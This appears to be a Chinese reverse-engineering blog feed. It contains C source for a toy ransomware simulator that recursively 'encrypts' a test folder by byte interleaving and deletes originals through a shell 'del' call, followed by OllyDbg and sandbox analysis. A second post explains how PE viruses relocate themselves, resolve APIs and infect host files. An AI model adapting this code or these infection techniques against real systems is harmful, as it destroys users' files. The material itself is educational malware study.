c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//文件加密函数 参数-文件名字</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">jiami</span><span class="params">(<span class="type">char</span>* fileName, <span class="type">char</span>* pathName)</span></span><br><span class="line">&#123;</span><br><span class="line">FILE* fp = <span class="literal">NULL</span>;                  <span class="comment">//文件指针变量</span></span><br><span class="line"><span class="type">int</span> size = <span class="number">0</span>;                     <span class="comment">//文件大小</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//打开文件</span></span><br><span class="line"><span class="comment">//注意： 使用二进制打开可以复制大型文件如.exe文件，音频视频文件等</span></span><br><span class="line">fp = fopen(fileName, <span class="string">&quot;rb&quot;</span>);       <span class="comment">//打开可读写的文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == fp) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开文件失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开 %s 文件成功!\n&quot;</span>, fileName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取文件大小</span></span><br><span class="line">fseek(fp, <span class="number">0</span>, SEEK_END);                   <span class="comment">//设置光标到文件末尾</span></span><br><span class="line">size = ftell(fp);                         <span class="comment">//计算光标位置距离文件头字节数</span></span><br><span class="line">fseek(fp, <span class="number">0</span>, SEEK_SET);                   <span class="comment">//设置光标位置到文件头</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;文件大小为：%d字节！\n&quot;</span>, size);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取文件所有内容</span></span><br><span class="line"><span class="type">char</span> code = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="type">char</span> ch;</span><br><span class="line"><span class="type">char</span> temp[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">&quot;%s\\%s&quot;</span>, pathName, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, temp);</span><br><span class="line"></span><br><span class="line">FILE* fpw = fopen(temp, <span class="string">&quot;wb&quot;</span>);         <span class="comment">//写入文件</span></span><br><span class="line"><span class="keyword">while</span> (!feof(fp)) &#123; </span><br><span class="line">ch = fgetc(fp);</span><br><span class="line">fputc(ch, fpw);</span><br><span class="line">fputc(code, fpw);</span><br><span class="line"><span class="comment">//printf(&quot;%c\n&quot;, ch);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//保存关闭</span></span><br><span class="line">fclose(fp);</span><br><span class="line">fclose(fpw);</span><br><span class="line"></span><br><span class="line"><span class="comment">//替换文件</span></span><br><span class="line"><span class="type">char</span> commend[<span class="number">1024</span>];</span><br><span class="line"><span class="built_in">memset</span>(commend, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(commend, <span class="string">&quot;del \&quot;%s\&quot;&quot;</span>, fileName);     <span class="comment">//访问路径包含空格增加双引号</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, commend);</span><br><span class="line">system(commend);</span><br><span class="line">rename(temp, fileName);                       <span class="comment">//调用C语言rename函数重命名文件</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//文件解密函数 参数-文件名字</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">jiemi</span><span class="params">(<span class="type">char</span>* fileName, <span class="type">char</span>* pathName)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> ch;</span><br><span class="line"><span class="type">int</span> size = <span class="number">0</span>;                        <span class="comment">//文件大小</span></span><br><span class="line">FILE* fp;                           <span class="comment">//打开文件</span></span><br><span class="line">FILE* fpw;                           <span class="comment">//写入文件</span></span><br><span class="line"><span class="type">char</span> tmp[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化操作</span></span><br><span class="line"><span class="built_in">memset</span>(tmp, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(tmp, <span class="string">&quot;%s\\tmp&quot;</span>, pathName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, tmp);</span><br><span class="line">fp = fopen(fileName, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">fpw = fopen(tmp, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">fseek(fpw, <span class="number">0</span>, SEEK_SET);             <span class="comment">//设置光标位置到文件头</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//每隔一个字节删除一个字节数据</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (!feof(fp)) &#123;</span><br><span class="line">ch = fgetc(fp);</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == (i % <span class="number">2</span>)) &#123; <span class="comment">//偶数写入</span></span><br><span class="line">i = <span class="number">1</span>;</span><br><span class="line">fputc(ch, fpw);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fclose(fp);</span><br><span class="line">fclose(fpw);</span><br><span class="line"></span><br><span class="line"><span class="comment">//替换文件</span></span><br><span class="line"><span class="type">char</span> commend[<span class="number">1024</span>];</span><br><span class="line"><span class="built_in">memset</span>(commend, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(commend, <span class="string">&quot;del \&quot;%s\&quot;&quot;</span>, fileName);     <span class="comment">//访问路径包含空格增加双引号</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, commend);</span><br><span class="line">system(commend);</span><br><span class="line">rename(tmp, fileName);                       <span class="comment">//调用C语言rename函数重命名文件</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历文件夹找到每个文件 参数-文件夹名字</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">findFile</span><span class="params">(<span class="type">char</span>* pathName)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* 禁止加密他人计算机,一定只能对指定目录加密,尤其不能对C盘加密 */</span></span><br><span class="line"><span class="comment">//1.设置要找的文件名 通配符实现</span></span><br><span class="line"><span class="type">char</span> findFileName[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">memset</span>(findFileName, <span class="number">0</span>, <span class="number">256</span>);                   <span class="comment">//清空数组</span></span><br><span class="line"><span class="built_in">sprintf</span>(findFileName, <span class="string">&quot;%s\\*.*&quot;</span>, pathName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;要找的文件名是：%s\n&quot;</span>, findFileName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.获取目录下第一个文件</span></span><br><span class="line">WIN32_FIND_DATA findData;                    <span class="comment">//定义结构体</span></span><br><span class="line">HANDLE hFile = FindFirstFile(findFileName, &amp;findData);</span><br><span class="line"><span class="comment">//判断返回值等于-1(INVALID_HANDLE_VALUE)</span></span><br><span class="line"><span class="keyword">if</span> (INVALID_HANDLE_VALUE == hFile) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;查找文件失败!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果成功进入死循环继续查找下一个文件</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">int</span> ret = <span class="number">1</span>;</span><br><span class="line"><span class="type">char</span> temp[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">while</span> (ret) &#123;</span><br><span class="line"><span class="comment">//如果找到的是个文件夹 则需要继续查找该文件夹内容</span></span><br><span class="line"><span class="keyword">if</span> (findData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) &#123;</span><br><span class="line"><span class="keyword">if</span>(findData.cFileName[<span class="number">0</span>] != <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line"><span class="comment">//文件夹拼接=原始路径+新文件夹路径</span></span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">&quot;%s\\%s&quot;</span>, pathName, findData.cFileName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到一个文件夹：%s\n&quot;</span>, temp);</span><br><span class="line">Sleep(<span class="number">1000</span>);                             <span class="comment">//暂停1秒钟</span></span><br><span class="line">findFile(temp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="comment">//如果是文件 则加密或解密文件</span></span><br><span class="line"><span class="built_in">memset</span>(temp, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp, <span class="string">&quot;%s\\%s&quot;</span>, pathName, findData.cFileName);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;找到一个文件：%s\n&quot;</span>, temp);</span><br><span class="line"><span class="comment">//加密文件</span></span><br><span class="line"><span class="comment">//jiami(temp, pathName);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//解密文件</span></span><br><span class="line">jiemi(temp, pathName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查找下一个文件</span></span><br><span class="line">ret = FindNextFile(hFile, &amp;findData);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buff[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">GetCurrentDirectory(<span class="number">256</span>, buff);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;当前目录是：%s\n\n&quot;</span>, buff);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//加解密指定文件夹目录 建议使用虚拟机执行</span></span><br><span class="line">findFile(<span class="string">&quot;C:\\Users\\v5le0n9\\Desktop\\l30n9ry0n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终结果如下：</p><img src="/posts/5ec21076/1.2.1.png" class=""><p>除了文本文件其它文件都复原了，这是为什么😓但是复原的文件都比最初始的文件多了2个字节，救命我也不知道为什么，可能是字符<code>\0</code>之类的？</p><h1 id="2-OD逆向分析加密PE文件"><a href="#2-OD逆向分析加密PE文件" class="headerlink" title="2. OD逆向分析加密PE文件"></a>2. OD逆向分析加密PE文件</h1><p>将上面编写的代码编译成EXE文件，我是拿去32位Win 7系统上编译的，这样编译出来的EXE也是32位，才能加载进OD分析。</p><img src="/posts/5ec21076/2.1.1.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc main.c -o main</span><br></pre></td></tr></table></figure><p>载入OD后，右键 -&gt; 查找 -&gt; 当前模块中的名称，查看该EXE调用到了哪些API函数。</p><img src="/posts/5ec21076/2.1.2.png" class=""><p>选中<code>FindFirstFileA()</code>右键 -&gt; 在每个参考上设置断点，如果在断点窗口没有看到断点，也就是断点没下成功，那就用另一种方法：在CPU窗口右键 -&gt; 查找 -&gt; 所有模块间的调用，找到<code>FindFirstFileA()</code>右键 -&gt; 在每个调用到 FindFirstFileA 上设置断点，找到两处。在断点窗口中选中某一个断点右键 -&gt; 反汇编窗口中跟随，可以查看这条指令上下有什么特别的指令。</p><p>运行，第一次断下显示：</p><img src="/posts/5ec21076/2.1.3.png" class=""><p>第二次断下显示：</p><img src="/posts/5ec21076/2.1.4.png" class=""><p>继续F7调试发现可以看到参数传递、字符串拼接、睡眠函数等内容，重点是我们要通过call分析进入到加密函数中，然后去分析加密函数里的算法从而实现逆向破解。</p><p>在逆向分析的过程中，需要思考几个问题：</p><ul><li>OD逆向怎么判断恶意样本执行或检测了哪些文件</li><li>OD逆向怎么判断恶意样本是否具有注册表操作、系统进程获取、屏幕截屏等操作</li><li>OD逆向怎么判断恶意样本的网络操作，IP地址、邮箱、域名访问请求情况</li><li>OD逆向怎么判断恶意样本是否具有蠕虫传播感染功能</li><li>怎么溯源一个恶意样本</li></ul><h1 id="3-在线沙箱分析"><a href="#3-在线沙箱分析" class="headerlink" title="3. 在线沙箱分析"></a>3. 在线沙箱分析</h1><p>在恶意样本逆向分析中，在线平台给我们提供了强大的支撑，我们拿到一个样本后可以先对其进行在线监测。其操作比较简单，就是将恶意样本上传至指定在线网址即可。常见的在线沙箱分析包括：</p><ul><li><a href="https://www.virustotal.com/">VirusTotal沙箱</a></li><li><a href="https://ti.qianxin.com/">360沙箱</a></li><li><a href="https://cuckoo.cert.ee/">Cuckoo沙箱</a></li><li><a href="https://s.threatbook.cn/">微步沙箱</a></li></ul><p>以VirusTotal沙箱为例，将我们的<code>main.exe</code>传上去，等待它检测。结果67家安全供应商中只有9家没有将这个文件标记为恶意文件。</p><img src="/posts/5ec21076/3.1.png" class=""><p>我们还可以看到样本的基本信息、文件历史信息以及PE文件节点信息。</p><img src="/posts/5ec21076/3.2.png" class=""><p>如果样本有恶意家族关联，它也能给出相应的信息。</p><img src="/posts/5ec21076/3.3.png" class="">]]></content>
    
    
    <summary type="html">&lt;p&gt;勒索病毒是一种新型电脑病毒，主要以邮件、程序木马、网页挂马的形式进行传播。这种病毒利用各种加密算法对文件进行加密，被感染者一般无法解密，必须拿到解密的私钥才有可能破解。&lt;/p&gt;
&lt;p&gt;现在就用C语言来实现一下系统文件加密及解密功能，简单模拟勒索病毒的加解密原理。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows PE病毒分类及感染方式</title>
    <link href="http://example.com/posts/adc1352a.html"/>
    <id>http://example.com/posts/adc1352a.html</id>
    <published>2022-05-22T00:36:31.469Z</published>
    <updated>2022-05-28T13:02:54.369Z</updated>
    
    <content type="html"><![CDATA[<p>以后我们很长时间都要与Windows PE病毒打交道，所以在这里就先了解下它的分类及感染方式吧。</p><span id="more"></span><h1 id="1-PE病毒的概念"><a href="#1-PE病毒的概念" class="headerlink" title="1. PE病毒的概念"></a>1. PE病毒的概念</h1><p>PE病毒又称为Win32 PE病毒，或称为Win32病毒，它指所有Windows下PE文件格式文件的感染病毒。因为它通常采用Win32汇编编写，而且格式为PE文件，因此得名。</p><p>PE病毒是以Windows PE程序为载体，能寄生于PE文件或Windows系统的病毒程序。</p><p>感染是指在尽量不影响目标程序(系统)正常功能的前提下，而使其具有病毒自身的功能。一个病毒通常包括如下模块：</p><ul><li>感染模块：被感染程序同样具备感染能力</li><li>触发模块：在特定条件下实施相应的病毒功能，比如日期、键盘输入等</li><li>破坏模块：网络攻击行为，推荐攻击链或ATT&amp;CK</li><li>其他模块</li></ul><p>如果我们要编写或分析PE病毒，则需要掌握以下关键信息：</p><ul><li>病毒的重定位</li><li>获取API函数地址</li><li>文件搜索</li><li>内存映射文件</li><li>病毒如何感染其它文件</li><li>病毒如何返回到Host程序</li></ul><h1 id="2-PE病毒分类"><a href="#2-PE病毒分类" class="headerlink" title="2. PE病毒分类"></a>2. PE病毒分类</h1><p>以感染目标进行分类，包括文件感染和系统感染。</p><h2 id="2-1-文件感染"><a href="#2-1-文件感染" class="headerlink" title="2.1 文件感染"></a>2.1 文件感染</h2><p>将代码寄生在PE文件，病毒本身只是PE文件的一部分，依赖于感染目标，通常也叫Host文件，控制权获得也是以目标程序运行来获得的。分为：</p><ul><li>传统感染型：以Win32汇编程序编写为主</li><li>捆绑释放型：编写难度较低，通过高级语言均可编写，将目标程序和病毒程序捆在一起，和捆绑器有相似之处</li></ul><h2 id="2-2-系统感染"><a href="#2-2-系统感染" class="headerlink" title="2.2 系统感染"></a>2.2 系统感染</h2><p>将代码或程序寄生在Windows操作系统，该类病毒越来越多，它不感染具体文件，但是它会在操作系统中保存自己的实体，同时也可以通过系统启动的方法来获得控制权。传播途径包括即时通信软件、U盘、光盘、电子邮件、网络共享等。</p><h1 id="3-传统文件感染型"><a href="#3-传统文件感染型" class="headerlink" title="3. 传统文件感染型"></a>3. 传统文件感染型</h1><h2 id="3-1-感染思路"><a href="#3-1-感染思路" class="headerlink" title="3.1 感染思路"></a>3.1 感染思路</h2><p>如下图所示，左边是一个正常的PE文件，右边是PE病毒感染该程序时的修改，病毒代码以新节的形式附在程序最后面。我们知道PE文件是由多个节组成的，病毒代码为了融入目标程序会以节的形式，同时修改PE文件头。</p><img src="/posts/adc1352a/3.1.1.png" class="" title="传统文件感染"><p>对感染来说，它一方面需要使得宿主具备自己的功能，另一方面也不破坏宿主程序的功能。所以病毒代码执行完毕之后，它必须将控制权交还给宿主，以免自己被发现。</p><ul><li>优点：被感染后的程序主体依然是目标程序，不影响目标程序图标，隐蔽性稍好。</li><li>缺点：对病毒代码的编写要求较高，通常是汇编语言编写；难以成功感染自校验程序。</li></ul><h2 id="3-2-感染的基本流程"><a href="#3-2-感染的基本流程" class="headerlink" title="3.2 感染的基本流程"></a>3.2 感染的基本流程</h2><p>比如某个Windows PE病毒只感染当前目录下的<code>test.exe</code>文件，它没有破坏性。<code>test.exe</code>被感染后，首先执行病毒代码，然后执行自身代码。假设在当前目录下存在4个文件：</p><ul><li>calc.exe：计算器</li><li>notepad.exe：记事本</li><li>test.exe：测试PE文件</li><li>main.exe：PE病毒程序</li></ul><p><code>test.exe</code>文件原始大小为2.5KB，程序入口地址为<code>00401000</code>。运行<code>main.exe</code>文件后，<code>test.exe</code>文件大小变为6.5KB，入口地址变为<code>004042DC</code>，也就是病毒代码的地址。病毒将被感染的<code>test.exe</code>重命名为<code>test-ok.exe</code>，然后将当前目录下某一个<code>.exe</code>文件(比如记事本)重命名为<code>test.exe</code>，如果我们运行测试PE文件，也就是<code>test-ok.exe</code>，它也能像<code>main.exe</code>一样去感染记事本，感染完后将记事本重命名为<code>test-oo.exe</code>，计算器也是如此被感染。</p><h2 id="3-3-关键技术"><a href="#3-3-关键技术" class="headerlink" title="3.3 关键技术"></a>3.3 关键技术</h2><h3 id="3-3-1-重定位"><a href="#3-3-1-重定位" class="headerlink" title="3.3.1 重定位"></a>3.3.1 重定位</h3><p>重定位在DLL文件尤其常见，因为DLL文件会加载到不同的位置，如果再按照VA定位会出错。对于病毒程序也是一样，它有相应的代码区感染目标程序，而目标程序有很多，病毒代码写在目标程序的什么位置呢？这就需要病毒代码去定位目标程序的位置，就要利用重定位技术。</p><ul><li>关键点：病毒代码寄生在目标程序的位置不固定</li><li>shellcode类似：通常需要注入远程系统，但这段代码在远程系统什么位置有时不能确定，另外远程系统的环境有时也不能准确感知，故需要使用重定位和API函数自动获取</li></ul><p>如下图所示，左边是病毒的RVA，其地址为<code>004010xx</code>；右图是当这段代码插入到另一个Host文件后，变量的实际位置和预期位置出现了差异，而重定位的关键是知道这个差异值是多少，后续遇到的各种变量或地址都可以通过这种差异方式校正。</p><img src="/posts/adc1352a/3.3.1.png" class="" title="重定位原因"><p>但是根据Host特征逐一硬编码这种方式并不可取，繁琐且未必准确，所以采用另一种方法，那就是病毒代码运行过程中自我重定位。</p><p>假设一个变量相对于病毒起始位置的偏移是9h，那么只要通过求得病毒插入到被感染对象后的病毒起始位置 + 这个变量相对于病毒起始位置的偏移 = 变量在被感染对象中的位置。</p><p><strong>那么如何求得插入感染对象后的病毒起始位置呢？</strong>由于每个被感染对象的大小都不一样，所以病毒插入到被感染对象后的起始位置也是不一样的。</p><p>首先我们要知道一些前置知识。call指令的作用是将下一条指令的地址压入堆栈，然后设置eip寄存器指向要跳转的地址。比如下面这两条指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00C9AF58   .  E8 93020000   call Crackme_.00C9B1F0</span><br><span class="line">00C9AF5D   .  6A 01         push 0x1</span><br></pre></td></tr></table></figure><p>F7进入函数，此时堆栈窗口栈顶数据为<code>00C9AF5D</code>，也就是call指令的下一条指令的地址；eip寄存器显示<code>00C9B1F0</code>，也就是指向要跳转的地址。</p><img src="/posts/adc1352a/3.3.2.png" class="" title="call指令的作用"><p>ebp是基址指针寄存器，总是指向系统栈最上面栈帧的底部。eip是指令指针寄存器，存放要执行的下一条指令的地址。</p><p>我们已经知道了call指令的功能，接下来就是利用call指令求得插入感染对象后的病毒起始位置。<strong>所以怎么利用？？变量delta也是在病毒里面的啊，与Var1有什么区别</strong></p><img src="/posts/adc1352a/3.3.3.png" class="" title="利用call指令"><h3 id="3-3-2-API函数自获取"><a href="#3-3-2-API函数自获取" class="headerlink" title="3.3.2 API函数自获取"></a>3.3.2 API函数自获取</h3><p>PE文件函数节的功能：当调用外部DLL中的API函数时，通过导入函数节这种关系定义出来，系统加载时就能加载对应的DLL文件并找到相应的API函数，再将地址写入到PE文件的导入函数表中，程序运行时就知道从导入函数表中取地址进行调用，这是正常的PE文件运行过程。通常函数节是由目标程序作者编写。</p><p>但对于病毒程序来说，它是一段代码，当它感染另外一个程序时，它是否能修改目标程序的导入函数节，而使得其可以服务病毒代码呢？理论上是可以的，但非常复杂，因为要在导入函数节添加东西一定会导致其它结构的变化，需要做很多的修正工作，这也可能破坏原有功能。所以对于病毒来说，它需要自己去获取API函数地址，并且没有导入函数节的支撑，但它又必须要使用很多API函数来实现病毒功能。</p><ul><li>关键点：需要使用API函数，但没有导入函数节支撑</li><li>shellcode类似：需要使用API函数自获取技术来确定注入远程系统的位置</li></ul><p><strong>如何获取API函数地址呢？</strong>有以下几种方法：</p><ul><li><p>搜寻宿主的导入表获得<code>GetModuleHandleA()</code>函数和<code>GetProcAddress()</code>函数的地址，然后通过它返回系统DLL的基址。因为很多程序都要使用这两个函数，因此在某些情况下是可行的。如果宿主没有使用<code>GetProcAddress()</code>，那就不得不搜寻导出表了</p></li><li><p>直接获得<code>kernel32.dll</code>的基址，然后再搜寻其导出表获得<code>GetProcAddress()</code>和<code>LoadLibraryA()</code>的地址，就能得到任何想调用的函数地址</p></li><li>硬编码调用函数，比如在9X下<code>GetModuleHandleA()</code>的地址一般是<code>BFF7xxxx</code></li></ul><p>第一种和第三种方法存在兼容性问题，第一种方法局限于目标程序使用<code>GetProcAddress()</code>函数；第三种方法存在硬编码的问题，操作系统不同就不能运行了。</p><ul><li><code>GetProcAddress()</code>函数：包括两个参数，模块基地址和想要获取的API函数名称，它将动态获得DLL函数的入口地址。</li><li><code>LoadLibraryA()</code>函数：将指定的DLL加载到内存中，返回值为DLL文件加载到内存中的基地址。</li></ul><p>明确采用第二种方法后，接下来的步骤就是获取<code>kernel32.dll</code>的基地址，通过<code>kernel32.dll</code>模块中的相应结构和特征定位。典型方法：定位<code>kernel32.dll</code>模块中任意一个地址，然后按照模块首地址特征(对齐于1000H，PE文件开始标识MZ)向低地址遍历定位PE文件头。</p><p><code>kernel32.dll</code>中任意一个地址从哪里获得？</p><ul><li>程序入口代码执行时栈顶存储的地址</li><li>SEH(结构化异常处理)链末端</li><li>PEB(进程环境块)相关数据结构指向了各模块的地址</li><li>栈中特定高端地址的数据</li></ul><p>注意：不同操作系统存在差别。</p><img src="/posts/adc1352a/3.3.4.png" class="" title="程序入口代码栈顶存储的地址"><p><strong>这个还是没说明白，看有没有合适的例子吧</strong></p><h3 id="3-3-3-目标程序遍历搜索"><a href="#3-3-3-目标程序遍历搜索" class="headerlink" title="3.3.3 目标程序遍历搜索"></a>3.3.3 目标程序遍历搜索</h3><p>通常以PE文件格式的文件(如EXE、DLL、SCR等)作为感染目标，其关键点为全盘查找或者部分盘符查找，遍历算法包括递归或非递归。在对目标进行搜索时，通常调用两个API函数：<code>FindFirstFile()</code>和<code>FindNextFile()</code>。</p><p>搜索目标进行感染算法如下：</p><ol><li>指定查找的目录为当前工作目录</li><li>开始搜索文件(*.*)</li><li>该目录搜索完毕？是则返回，否则继续</li><li>找到文件还是目录？目录则调用自身函数(也就是递归)，否则继续</li><li>是文件，如符合感染条件，则调用感染模块，否则继续</li><li>搜索下一个文件(<code>FindNextFile()</code>)，转到3继续</li></ol><h3 id="3-3-4-文件感染"><a href="#3-3-4-文件感染" class="headerlink" title="3.3.4 文件感染"></a>3.3.4 文件感染</h3><p>感染的关键是病毒代码能够得到运行，常用方法包括：</p><ul><li>选择合适的位置放入病毒代码(已有节、新增节)</li><li>将控制权交给病毒代码，如修改程序入口点<code>AddressofEntryPonit</code>，或者在原目标代码执行过程中运行病毒代码(EPO(EntryPoint Obscuring)技术)</li></ul><p>同时，病毒代码执行时，程序的正常功能不能被破坏，即控制权的交换。</p><ul><li>感染时，记录原始“程序控制点位置”</li><li>病毒代码执行完毕之后，返回控制权</li><li>避免重复感染，感染标记</li></ul><h4 id="3-3-4-1-文件感染分类"><a href="#3-3-4-1-文件感染分类" class="headerlink" title="3.3.4.1 文件感染分类"></a>3.3.4.1 